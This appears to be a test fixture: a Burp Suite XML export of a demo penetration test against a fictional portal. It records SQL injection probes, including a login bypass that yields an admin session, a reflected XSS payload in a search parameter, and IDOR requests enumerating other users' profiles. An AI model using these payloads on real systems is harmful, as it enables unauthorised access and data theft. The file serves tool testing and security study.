@@ -1,0 +1,170 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ELEMENT item (time?, url, host, port, protocol, method, path, extension?, request, status, responselength?, mimetype?, response?, comment?)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2025.5.1">
+
+  <!-- Baseline: normal login -->
+  <item>
+    <time>Wed May 28 09:15:22 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/login]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/api/login]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[UE9TVCAvYXBpL2xvZ2luIEhUVFAvMS4xDQpIb3N0OiBwb3J0YWwuYWNtZS1kZW1vLmNvbQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpDb250ZW50LUxlbmd0aDogNTINCg0KeyJ1c2VybmFtZSI6ImpzbWl0aCIsInBhc3N3b3JkIjoiV2ludGVyMjAyNSEifQ==]]></request>
+    <status>200</status>
+    <responselength>126</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NClNldC1Db29raWU6IHNlc3Npb249ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlKMWFXUWlPakV5TENKeWIyeGxJam9pZFhObGNpSjkuZmFrZTsgUGF0aD0vOyBIdHRwT25seQ0KDQp7InN0YXR1cyI6Im9rIiwidXNlcl9pZCI6NDIsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkpvaG4gU21pdGgifQ==]]></response>
+    <comment></comment>
+  </item>
+
+  <!-- SQLi probe: error-based -->
+  <item>
+    <time>Wed May 28 09:18:05 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/login]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/api/login]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[UE9TVCAvYXBpL2xvZ2luIEhUVFAvMS4xDQpIb3N0OiBwb3J0YWwuYWNtZS1kZW1vLmNvbQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpDb250ZW50LUxlbmd0aDogNDkNCg0KeyJ1c2VybmFtZSI6ImFkbWluJyBPUiAxPTEtLSIsInBhc3N3b3JkIjoieCJ9]]></request>
+    <status>500</status>
+    <responselength>248</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIEludGVybmFsIFNlcnZlciBFcnJvcg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQoNCnsiZXJyb3IiOiJQRzo6U3ludGF4RXJyb3I6IEVSUk9SOiAgdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmcgYXQgb3IgbmVhciAiJyBPUiAxPTEtLScgQU5EIHBhc3N3b3JkX2hhc2ggPSAnIiIsImRldGFpbCI6IlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnYWRtaW4nIE9SIDE9MS0tJyBBTkQgcGFzc3dvcmRfaGFzaCA9ICc1ZTg4NDg5OGRhLi4nIn0=]]></response>
+    <comment>SQLi - error based, leaks query structure</comment>
+  </item>
+
+  <!-- SQLi: successful auth bypass -->
+  <item>
+    <time>Wed May 28 09:19:12 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/login]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/api/login]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[UE9TVCAvYXBpL2xvZ2luIEhUVFAvMS4xDQpIb3N0OiBwb3J0YWwuYWNtZS1kZW1vLmNvbQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpDb250ZW50LUxlbmd0aDogNTUNCg0KeyJ1c2VybmFtZSI6ImFkbWluJyBPUiAxPTEtLSAtIiwicGFzc3dvcmQiOiJhbnl0aGluZyJ9]]></request>
+    <status>200</status>
+    <responselength>118</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NClNldC1Db29raWU6IHNlc3Npb249ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlKMWFXUWlPakVzSW5KdmJHVWlPaUpoWkcxcGJpSjkuZmFrZTsgUGF0aD0vOyBIdHRwT25seQ0KDQp7InN0YXR1cyI6Im9rIiwidXNlcl9pZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluIFVzZXIifQ==]]></response>
+    <comment>SQLi - auth bypass confirmed, admin session obtained</comment>
+  </item>
+
+  <!-- Reflected XSS in search -->
+  <item>
+    <time>Wed May 28 09:25:33 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9zZWFyY2g/cT0lM0NzY3JpcHQlM0VhbGVydChkb2N1bWVudC5kb21haW4pJTNDL3NjcmlwdCUzRSBIVFRQLzEuMQ0KSG9zdDogcG9ydGFsLmFjbWUtZGVtby5jb20NCkNvb2tpZTogc2Vzc2lvbj1leUpoYkdjaU9pSklVekkxTmlKOS5leUoxYVdRaU9qUXlMQ0p5YjJ4bElqb2lkWE5sY2lKOS5mYWtlDQoNCg==]]></request>
+    <status>200</status>
+    <responselength>178</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOA0KDQo8IURPQ1RZUEUgaHRtbD48aHRtbD48Ym9keT48aDE+U2VhcmNoIHJlc3VsdHMgZm9yOiA8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD48L2gxPjxwPk5vIHJlc3VsdHMgZm91bmQuPC9wPjwvYm9keT48L2h0bWw+]]></response>
+    <comment>XSS - reflected, no encoding on search param</comment>
+  </item>
+
+  <!-- IDOR: own profile (baseline) -->
+  <item>
+    <time>Wed May 28 09:30:01 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/users/42/profile]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/api/users/42/profile]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvdXNlcnMvNDIvcHJvZmlsZSBIVFRQLzEuMQ0KSG9zdDogcG9ydGFsLmFjbWUtZGVtby5jb20NCkNvb2tpZTogc2Vzc2lvbj1leUpoYkdjaU9pSklVekkxTmlKOS5leUoxYVdRaU9qUXlMQ0p5YjJ4bElqb2lkWE5sY2lKOS5mYWtlDQoNCg==]]></request>
+    <status>200</status>
+    <responselength>142</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NCg0KeyJ1c2VyX2lkIjo0MiwibmFtZSI6IkpvaG4gU21pdGgiLCJlbWFpbCI6ImpzbWl0aEBhY21lLWRlbW8uY29tIiwicm9sZSI6InVzZXIiLCJzc24iOiIqKiotKiotMTIzNCIsInNhbGFyeSI6ODUwMDB9]]></response>
+    <comment></comment>
+  </item>
+
+  <!-- IDOR: admin profile accessed as regular user -->
+  <item>
+    <time>Wed May 28 09:30:45 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/users/1/profile]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/api/users/1/profile]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvdXNlcnMvMS9wcm9maWxlIEhUVFAvMS4xDQpIb3N0OiBwb3J0YWwuYWNtZS1kZW1vLmNvbQ0KQ29va2llOiBzZXNzaW9uPWV5SmhiR2NpT2lKSVV6STFOaUo5LmV5SjFhV1FpT2pReUxDSnliMnhsSWpvaWRYTmxjaUo5LmZha2UNCg0K]]></request>
+    <status>200</status>
+    <responselength>148</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NCg0KeyJ1c2VyX2lkIjoxLCJuYW1lIjoiQWRtaW4gVXNlciIsImVtYWlsIjoiYWRtaW5AYWNtZS1kZW1vLmNvbSIsInJvbGUiOiJhZG1pbiIsInNzbiI6IioqKi0qKi01Njc4Iiwic2FsYXJ5IjoxNDUwMDB9]]></response>
+    <comment>IDOR - accessed admin profile as user 42</comment>
+  </item>
+
+  <!-- IDOR: HR profile enumerated -->
+  <item>
+    <time>Wed May 28 09:31:10 UTC 2025</time>
+    <url><![CDATA[https://portal.acme-demo.com/api/users/2/profile]]></url>
+    <host ip="10.0.1.50">portal.acme-demo.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/api/users/2/profile]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvdXNlcnMvMi9wcm9maWxlIEhUVFAvMS4xDQpIb3N0OiBwb3J0YWwuYWNtZS1kZW1vLmNvbQ0KQ29va2llOiBzZXNzaW9uPWV5SmhiR2NpT2lKSVV6STFOaUo5LmV5SjFhV1FpT2pReUxDSnliMnhsSWpvaWRYTmxjaUo5LmZha2UNCg0K]]></request>
+    <status>200</status>
+    <responselength>138</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24NCg0KeyJ1c2VyX2lkIjoyLCJuYW1lIjoiSmFuZSBEb2UiLCJlbWFpbCI6Impkb2VAYWNtZS1kZW1vLmNvbSIsInJvbGUiOiJociIsInNzbiI6IioqKi0qKi05MDEyIiwic2FsYXJ5Ijo5MjAwMH0=]]></response>
+    <comment>IDOR - enumerated HR user profile</comment>
+  </item>
+
+  <!-- Out-of-scope: CDN request (should be filtered) -->
+  <item>
+    <time>Wed May 28 09:16:00 UTC 2025</time>
+    <url><![CDATA[https://cdn.tracking-service.com/analytics.js]]></url>
+    <host ip="104.18.32.7">cdn.tracking-service.com</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/analytics.js]]></path>
+    <extension>js</extension>
+    <request base64="true"><![CDATA[R0VUIC9hbmFseXRpY3MuanMgSFRUUC8xLjENCkhvc3Q6IGNkbi50cmFja2luZy1zZXJ2aWNlLmNvbQ0KDQo=]]></request>
+    <status>200</status>
+    <responselength>14</responselength>
+    <mimetype>script</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2phdmFzY3JpcHQNCg0KLy8gYW5hbHl0aWNz]]></response>
+    <comment></comment>
+  </item>
+
+</items>
